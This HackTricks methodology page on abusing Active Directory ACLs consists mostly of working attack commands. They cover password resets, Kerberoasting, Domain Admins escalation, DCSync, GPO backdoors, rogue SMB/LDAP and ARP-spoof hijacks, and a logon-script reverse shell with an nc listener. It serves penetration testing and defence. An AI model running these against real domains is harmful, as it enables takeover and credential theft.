---
title: "Abusing Active Directory ACLs/ACEs"
source: hacktricks.wiki
source_url: https://hacktricks.wiki/windows-hardening/active-directory-methodology/acl-persistence-abuse/index.html
fetched_at: 2026-09-20T09:50:19Z
license: unspecified
category: ad
---

## BadSuccessor

## **GenericAll Rights on User**

**GenericAll Rights on User**

This privilege grants an attacker full control over a target user account. Once `GenericAll` rights are confirmed using the `Get-ObjectAcl` command, an attacker can:

- **Change the Target’s Password** : Using`net user <username> <password> /domain` , the attacker can reset the user’s password.
- From Linux, you can do the same over SAMR with Samba `net rpc` :<sup>[\[9\]](#references)[\[10\]](#references)</sup>

```
# Reset target user's password over SAMR from Linux
net rpc password <samAccountName> '<NewPass>' -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```
- **If the account is disabled, clear the UAC flag** :`GenericAll` allows editing`userAccountControl` . From Linux, BloodyAD can remove the`ACCOUNTDISABLE` flag:<sup>[\[8\]](#references)[\[10\]](#references)</sup>

```
bloodyAD --host <dc_fqdn> -d <domain> -u <user> -p '<pass>' remove uac <samAccountName> -f ACCOUNTDISABLE
```
- **Targeted Kerberoasting** : Assign an SPN to the user’s account to make it kerberoastable, then use Rubeus and targetedKerberoast.py to extract and attempt to crack the ticket-granting ticket (TGT) hashes.

```
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
.\Rubeus.exe kerberoast /user:<username> /nowrap
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
```
- **Targeted ASREPRoasting** : Disable pre-authentication for the user, making their account vulnerable to ASREPRoasting.

```
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```
- **Shadow Credentials / Key Credential Link** : With`GenericAll` on a user you can add a certificate-based credential and authenticate as them without changing their password. See:

## **GenericAll Rights on Group**

**GenericAll Rights on Group**

This privilege allows an attacker to manipulate group memberships if they have `GenericAll` rights on a group like `Domain Admins`. After identifying the group’s distinguished name with `Get-NetGroup`, the attacker can:

- **Add Themselves to the Domain Admins Group** : This can be done via direct commands or using modules like Active Directory or PowerSploit.

```
net group "domain admins" spotless /add /domain
Add-ADGroupMember -Identity "domain admins" -Members spotless
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```
- From Linux you can also leverage BloodyAD to add yourself into arbitrary groups when you hold GenericAll/Write membership over them. If the target group is nested into “Remote Management Users”, you will immediately gain WinRM access on hosts honoring that group:<sup>[\[8\]](#references)</sup>

```
# Linux tooling example (BloodyAD) to add yourself to a target group
bloodyAD --host <dc-fqdn> -d <domain> -u <user> -p '<pass>' add groupMember "<Target Group>" <user>
# If the target group is member of "Remote Management Users", WinRM becomes available
netexec winrm <dc-fqdn> -u <user> -p '<pass>'
```
## **GenericAll / GenericWrite / Write on Computer/User**

**GenericAll / GenericWrite / Write on Computer/User**

Holding these privileges on a computer object or a user account allows for:

- **Kerberos Resource-based Constrained Delegation** : Enables taking over a computer object.
- **Shadow Credentials** : Use this technique to impersonate a computer or user account by exploiting the privileges to create shadow credentials.

## **WriteProperty on Group**

**WriteProperty on Group**

If a user has `WriteProperty` rights on all objects for a specific group (e.g., `Domain Admins`), they can:

- **Add Themselves to the Domain Admins Group** : Achievable via combining`net user` and`Add-NetGroupUser` commands, this method allows privilege escalation within the domain.

```
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **Self (Self-Membership) on Group**

**Self (Self-Membership) on Group**

This privilege enables attackers to add themselves to specific groups, such as `Domain Admins`, through commands that manipulate group membership directly. Using the following command sequence allows for self-addition:

```
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **WriteProperty (Self-Membership)**

**WriteProperty (Self-Membership)**

A similar privilege, this allows attackers to directly add themselves to groups by modifying group properties if they have the `WriteProperty` right on those groups. The confirmation and execution of this privilege are performed with:

```
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
net group "domain admins" spotless /add /domain
```
## **ForceChangePassword**

**ForceChangePassword**

Holding the `ExtendedRight` on a user for `User-Force-Change-Password` allows password resets without knowing the current password. Verification of this right and its exploitation can be done through PowerShell or alternative command-line tools, offering several methods to reset a user’s password, including interactive sessions and one-liners for non-interactive environments. The commands range from simple PowerShell invocations to using `rpcclient` on Linux, demonstrating the versatility of attack vectors.

```
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainUserPassword -Identity delegate -Verbose
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```
```
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```
## **WriteOwner on Group**

**WriteOwner on Group**

If an attacker finds that they have `WriteOwner` rights over a group, they can change the ownership of the group to themselves. This is particularly impactful when the group in question is `Domain Admins`, as changing ownership allows for broader control over group attributes and membership. The process involves identifying the correct object via `Get-ObjectAcl` and then using `Set-DomainObjectOwner` to modify the owner, either by SID or name.

```
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```
## **GenericWrite on User**

**GenericWrite on User**

This permission allows an attacker to modify user properties. Specifically, with `GenericWrite` access, the attacker can change the logon script path of a user to execute a malicious script upon user logon. This is achieved by using the `Set-ADObject` command to update the `scriptpath` property of the target user to point to the attacker’s script.

```
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```
## **GenericWrite on Group**

**GenericWrite on Group**

With this privilege, attackers can manipulate group membership, such as adding themselves or other users to specific groups. This process involves creating a credential object, using it to add or remove users from a group, and verifying the membership changes with PowerShell commands.

```
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```
- From Linux, Samba `net` can add/remove members when you hold`GenericWrite` on the group (useful when PowerShell/RSAT are unavailable):<sup>[\[9\]](#references)[\[10\]](#references)</sup>

```
# Add yourself to the target group via SAMR
net rpc group addmem "<Group Name>" <user> -U <domain>/<user>%'<pass>' -S <dc_fqdn>
# Verify current members
net rpc group members "<Group Name>" -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```
## **WriteDACL + WriteOwner**

**WriteDACL + WriteOwner**

Owning an AD object and having `WriteDACL` privileges on it enables an attacker to grant themselves `GenericAll` privileges over the object. This is accomplished through ADSI manipulation, allowing for full control over the object and the ability to modify its group memberships. Despite this, limitations exist when trying to exploit these privileges using the Active Directory module’s `Set-Acl` / `Get-Acl` cmdlets.[\[4\]](#references)[\[7\]](#references)

```
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```
### WriteDACL/WriteOwner quick takeover (PowerView)

When you have `WriteOwner` and `WriteDacl` over a user or service account, you can take full control and reset its password using PowerView without knowing the old password:

```
# Load PowerView
. .\PowerView.ps1
# Grant yourself full control over the target object (adds GenericAll in the DACL)
Add-DomainObjectAcl -Rights All -TargetIdentity <TargetUserOrDN> -PrincipalIdentity <YouOrYourGroup> -Verbose
# Set a new password for the target principal
$cred = ConvertTo-SecureString 'P@ssw0rd!2025#' -AsPlainText -Force
Set-DomainUserPassword -Identity <TargetUser> -AccountPassword $cred -Verbose
```
Notes:

- You may need to first change the owner to yourself if you only have `WriteOwner` :

```
Set-DomainObjectOwner -Identity <TargetUser> -OwnerIdentity <You>
```
- Validate access with any protocol (SMB/LDAP/RDP/WinRM) after password reset.

## **Replication on the Domain (DCSync)**

**Replication on the Domain (DCSync)**

The DCSync attack leverages specific replication permissions on the domain to mimic a Domain Controller and synchronize data, including user credentials. This powerful technique requires permissions like `DS-Replication-Get-Changes`, allowing attackers to extract sensitive information from the AD environment without direct access to a Domain Controller.[\[5\]](#references)**Learn more about the DCSync attack here.**

## GPO Delegation

### GPO Delegation

Delegated access to manage Group Policy Objects (GPOs) can present significant security risks. For instance, if a user such as `offense\spotless` is delegated GPO management rights, they may have privileges like **WriteProperty**, **WriteDacl**, and **WriteOwner**. These permissions can be abused for malicious purposes, as identified using PowerView: `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`[\[6\]](#references)

### Enumerate GPO Permissions

To identify misconfigured GPOs, PowerSploit’s cmdlets can be chained together. This allows for the discovery of GPOs that a specific user has permissions to manage: `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

**Computers with a Given Policy Applied**: It’s possible to resolve which computers a specific GPO applies to, helping understand the scope of potential impact. `powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`

**Policies Applied to a Given Computer**: To see what policies are applied to a particular computer, commands like `Get-DomainGPO` can be utilized.

**OUs with a Given Policy Applied**: Identifying organizational units (OUs) affected by a given policy can be done using `Get-DomainOU`.

You can also use the tool [**GPOHound**](https://github.com/cogiceo/GPOHound) to enumerate GPOs and find issues in them.

### Abuse GPO - New-GPOImmediateTask

Misconfigured GPOs can be exploited to execute code, for example, by creating an immediate scheduled task. This can be done to add a user to the local administrators group on affected machines, significantly elevating privileges:

```
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```
### GroupPolicy module - Abuse GPO

The GroupPolicy module, if installed, allows for the creation and linking of new GPOs, and setting preferences such as registry values to execute backdoors on affected computers. This method requires the GPO to be updated and a user to log in to the computer for execution:

```
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```
### SharpGPOAbuse - Abuse GPO

SharpGPOAbuse offers a method to abuse existing GPOs by adding tasks or modifying settings without the need to create new GPOs. This tool requires modification of existing GPOs or using RSAT tools to create new ones before applying changes:

```
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```
### Force Policy Update

GPO updates typically occur around every 90 minutes. To expedite this process, especially after implementing a change, the `gpupdate /force` command can be used on the target computer to force an immediate policy update. This command ensures that any modifications to GPOs are applied without waiting for the next automatic update cycle.

### Under the Hood

Upon inspection of the Scheduled Tasks for a given GPO, like the `Misconfigured Policy`, the addition of tasks such as `evilTask` can be confirmed. These tasks are created through scripts or command-line tools aiming to modify system behavior or escalate privileges.

The structure of the task, as shown in the XML configuration file generated by `New-GPOImmediateTask`, outlines the specifics of the scheduled task - including the command to be executed and its triggers. This file represents how scheduled tasks are defined and managed within GPOs, providing a method for executing arbitrary commands or scripts as part of policy enforcement.

### Users and Groups

GPOs also allow for the manipulation of user and group memberships on target systems. By editing the Users and Groups policy files directly, attackers can add users to privileged groups, such as the local `administrators` group. This is possible through the delegation of GPO management permissions, which permits the modification of policy files to include new users or change group memberships.

The XML configuration file for Users and Groups outlines how these changes are implemented. By adding entries to this file, specific users can be granted elevated privileges across affected systems. This method offers a direct approach to privilege escalation through GPO manipulation.

Furthermore, additional methods for executing code or maintaining persistence, such as leveraging logon/logoff scripts, modifying registry keys for autoruns, installing software via .msi files, or editing service configurations, can also be considered. These techniques provide various avenues for maintaining access and controlling target systems through the abuse of GPOs.

### Redirecting GPC/GPT retrieval to authenticated rogue services

A GPO consists of an LDAP **Group Policy Container (GPC)** with metadata and an SMB-hosted **Group Policy Template (GPT)** with the policy files. During refresh, the client follows the container’s `gPLink`, reads the referenced GPC and its `gPCFileSysPath`, then downloads the GPT from that UNC path. Consequently, write access to either the GPC itself or the `gPLink` of an OU, Site or Domain can be converted into privileged policy processing.[\[12\]](#references)[\[13\]](#references)[\[14\]](#references)[\[15\]](#references)

#### `gPCFileSysPath` poisoning with GPOddity

`gPCFileSysPath` poisoning with GPOddity
If the controlled principal can write the target GPC (directly or through **NTLM relay to LDAP**), replace `gPCFileSysPath` with a UNC path hosted by the attacker. [GPOddity](https://github.com/synacktiv/GPOddity) automates the LDAP change and serves a malicious GPT containing module-based policy files or an Immediate Task that the Group Policy client executes as `NT AUTHORITY\SYSTEM`.[\[12\]](#references)[\[15\]](#references)[\[16\]](#references)

An anonymous or credential-agnostic SMB share is not sufficient on current Windows clients: SMB Secure Negotiate requires proof that authentication succeeded, so the rogue service must validate the domain identity, derive the SMB session key and correctly sign its responses. In embedded mode, configure GPOddity with a controlled machine account and its service key, then select a computer- or user-side payload in the `[COMMANDS]` section.[\[15\]](#references)[\[16\]](#references)

```
[SMB]
smb-mode=embedded
smb-machine=SCAPY$
smb-ip=<attacker_ip>
smb-nt=<machine_nt_hash>
smb-share=gpoddity
smb-iface=eth0
```
```
python3 gpoddity.py --config config.ini -v
```
**User GPO edge case:** after MS16-072, Windows still creates two SMB2 sessions in the **same TCP connection**: the user session reads `GPT.INI`, then the computer-account session reads effective configuration such as `ScheduledTasks.xml`. A rogue server must therefore index authentication state, session keys and signing keys by SMB2 `SessionId`, not only by socket. The Scapy fork embedded in GPOddity/OUned implements this through `SMBStreamSocketMultiplexing` and a multiplexing-aware `SMBServer`; single-session Impacket/Scapy servers otherwise reuse the wrong signing state and fail on user policies.[\[15\]](#references)

#### `gPLink` poisoning with OUned

`gPLink` poisoning with OUned
With `WriteGPLink`, `GenericWrite` or equivalent control over an OU, Site or Domain, an attacker can append a link whose GPC DN is served by an attacker-controlled LDAP host. This primitive was originally presented by Petros Koutroumpis; [OUned](https://github.com/synacktiv/OUned) automates the LDAP write and the malicious GPC/GPT chain.[\[13\]](#references)[\[14\]](#references)[\[17\]](#references)

```
[LDAP://cn={7B7D6B23-26F8-4E4B-AF23-F9B9005167F6},cn=policies,cn=system,DC=attacker,DC=corp,DC=com;0]
```
The victim first authenticates to the rogue LDAP service and receives a GPC whose `gPCFileSysPath` points to the rogue SMB service; it then authenticates to SMB and applies the supplied GPT. OUned therefore needs an account with an LDAP SPN, a machine account with a HOST SPN for SMB (the same machine account can satisfy both), and DNS resolution or reverse forwarding that sends ports 389 and 445 to the operator host.[\[15\]](#references)[\[17\]](#references)

```
python3 OUned.py --config config.ini -v
```
OUned’s embedded Scapy LDAP server validates Kerberos/SPNEGO with the real controlled service key and serves arbitrary GPC data from JSON. The empty JSON key models rootDSE, `base64:` prefixes represent binary values, and the server supports add/delete/modify/search plus `BASE`, `LEVEL` and `SUBTREE` searches; it can negotiate no protection, integrity or confidentiality. This makes the service reusable when another Windows component follows an attacker-controlled LDAP reference but insists on authenticated LDAP.[\[15\]](#references)

Do not assume that synchronizing an account password into a dummy domain reproduces every Kerberos key: RC4 derives from the password, whereas AES string-to-key also uses a salt derived from the principal’s hostname/domain. Supplying the actual account AES key to `KerberosSSP` avoids forcing RC4 through a detectable change to the machine account’s self-writable `msDS-SupportedEncryptionTypes`.[\[15\]](#references)

#### Detection pivots

Correlate changes to `gPCFileSysPath` or `gPLink` with GPO version changes and new Immediate/Scheduled Task XML. Investigate links to unexpected naming contexts, UNC hosts outside the approved DC/SYSVOL set, DNS records redirecting machine-account names, LDAP/CIFS service tickets for unusual machine accounts, and `msDS-SupportedEncryptionTypes` changes that enable RC4.[\[15\]](#references)

### WriteGPLink + UNC path hijacking (ARP spoofing)

`WriteGPLink` over an OU/domain lets you modify the target container’s `gPLink` attribute and **force an existing GPO to apply** without editing the GPO itself. This becomes interesting when the linked GPO already references remote content over **UNC paths** (`\\HOST\share\...`), because authenticated users can read **SYSVOL** and hunt for reusable policies offline.[\[11\]](#references)

High-level workflow:

1. Use BloodHound to identify a principal with `WriteGPLink` over an OU and enumerate computers/users inside that OU.
2. Clone `SYSVOL` read-only and parse GPOs looking for**Software Installation** ,**drive mappings** (`Drives.xml` ), and**logon/startup scripts** that reference UNC paths.
3. Prefer policies pointing to a **direct hostname** (for example`\\DC02\share\pkg.msi` ) instead of DFS/domain-namespace paths, because hostname-based paths are easier to redirect with L2 spoofing.
4. Append the chosen GPO GUID to the target OU’s `gPLink` so the victim processes that already-existing policy.
5. On the same broadcast domain, ARP spoof the UNC host and bind its IP locally (`ip addr add <target_ip>/32 dev <iface>` ) so the victim’s SMB traffic reaches your host.
6. Serve the expected path/filename from an attacker SMB server (for example `smbserver.py` ) and wait for normal policy processing.

Example `SYSVOL` collection and GPO correlation:

```
mkdir -p /mnt/$DOMAIN/SYSVOL/
mount -t cifs -o username=$USER,password=$PASS,domain=$DOMAIN,ro "//$DC_IP/SYSVOL" "/mnt/$DOMAIN/SYSVOL/"
rsync -av --exclude="PolicyDefinitions" --update /mnt/$DOMAIN/SYSVOL .
python3 parse_sysvol.py software -s <SYSVOL> -b <BloodHound_Folder>
python3 parse_sysvol.py drives -s <SYSVOL> -b <BloodHound_Folder>
python3 parse_sysvol.py scripts -s <SYSVOL> -b <BloodHound_Folder>
```
Link the existing GPO to the target OU:

```
python3 link_gpo.py -u <user> -p '<pass>' -d <domain> -dc-ip <dc_ip> \
  --gpo-guid '{<gpo-guid>}' --target-ou "OU=<TargetOU>,DC=<domain>,DC=<tld>"
```
#### Software Installation UNC hijack -> SYSTEM

If the linked GPO deploys an MSI from a UNC path, the client will fetch it during **computer startup** and install it as **`NT AUTHORITY\SYSTEM`**. By spoofing the referenced host and serving a malicious MSI under the **same share/path/name**, you can turn `WriteGPLink` into SYSTEM code execution **without modifying SYSVOL**.

Important constraints:

- **Timing matters** : the new link is seen at policy refresh (commonly ~90 minutes), but**Software Installation** usually triggers on**reboot** .
- Windows Installer commonly tracks the deployment using the package **`ProductCode`** . If the product is already installed, deployment may be skipped.
- To avoid installer rejection, patch the rogue MSI so its **`ProductCode`** and**`PackageCode`** match the legitimate package expected by the GPO.
- Old `.aas` advertisement files may remain in`SYSVOL` , so validate that the deployment still looks active before relying on it.

```
ip addr add <unc_host_ip>/32 dev <iface>
arpspoof-ng -i <iface> -t <victim1>,<victim2> -s <unc_host_ip>
smbserver.py <share> ./payloads -smb2support --interface-address <unc_host_ip> -debug -ts
```
#### Drive-map UNC hijack -> NTLM capture / WebDAV relay

GPP drive mappings in `Drives.xml` cause users to authenticate to the configured UNC path during logon or reconnection. If you spoof the referenced host, you can capture **NetNTLMv2**. If SMB is deliberately made to fail, Windows may retry over **WebDAV**, sending **NTLM over HTTP**, which is far more flexible for relays to **LDAP(S)**, **AD CS**, or **SMB**.

#### Logon/startup script UNC hijack

The same pattern applies to UNC-hosted scripts discovered in `SYSVOL`:

- **Logon scripts** usually execute in the**user** context.
- **Startup scripts** usually execute in the**computer / SYSTEM** context.

If the script path points to a spoofable hostname, redirect the UNC host and serve replacement script content from the expected location.

## SYSVOL/NETLOGON Logon Script Poisoning

Writable paths under `\\<dc>\SYSVOL\<domain>\scripts\` or `\\<dc>\NETLOGON\` allow tampering with logon scripts executed at user logon via GPO. This yields code execution in the security context of logging users.

### Locate logon scripts

- Inspect user attributes for a configured logon script:

```
Get-DomainUser -Identity <user> -Properties scriptPath, scriptpath
```
- Crawl domain shares to surface shortcuts or references to scripts:

```
# NetExec spider (authenticated)
netexec smb <dc_fqdn> -u <user> -p <pass> -M spider_plus
```
- Parse `.lnk` files to resolve targets pointing into SYSVOL/NETLOGON (useful DFIR trick and for attackers without direct GPO access):

```
# LnkParse3
lnkparse login.vbs.lnk
# Example target revealed:
# C:\Windows\SYSVOL\sysvol\<domain>\scripts\login.vbs
```
- BloodHound displays the `logonScript` (scriptPath) attribute on user nodes when present.

### Validate write access (don’t trust share listings)

Automated tooling may show SYSVOL/NETLOGON as read-only, but underlying NTFS ACLs can still allow writes. Always test:

```
# Interactive write test
smbclient \\<dc>\SYSVOL -U <user>%<pass>
smb: \\> cd <domain>\scripts\
smb: \\<domain>\scripts\\> put smallfile.txt login.vbs   # check size/time change
```
If file size or mtime changes, you have write. Preserve originals before modifying.

### Poison a VBScript logon script for RCE

Append a command that launches a PowerShell reverse shell (generate from revshells.com) and keep original logic to avoid breaking business function:

```
' At top of login.vbs
Set cmdshell = CreateObject("Wscript.Shell")
cmdshell.run "powershell -e <BASE64_PAYLOAD>"
' Existing mappings remain
MapNetworkShare "\\\\<dc_fqdn>\\apps", "V"
MapNetworkShare "\\\\<dc_fqdn>\\docs", "L"
```
Listen on your host and wait for the next interactive logon:

```
rlwrap -cAr nc -lnvp 443
```
Notes:

- Execution happens under the logging user’s token (not SYSTEM). Scope is the GPO link (OU, site, domain) applying that script.
- Clean up by restoring the original content/timestamps after use.

## References
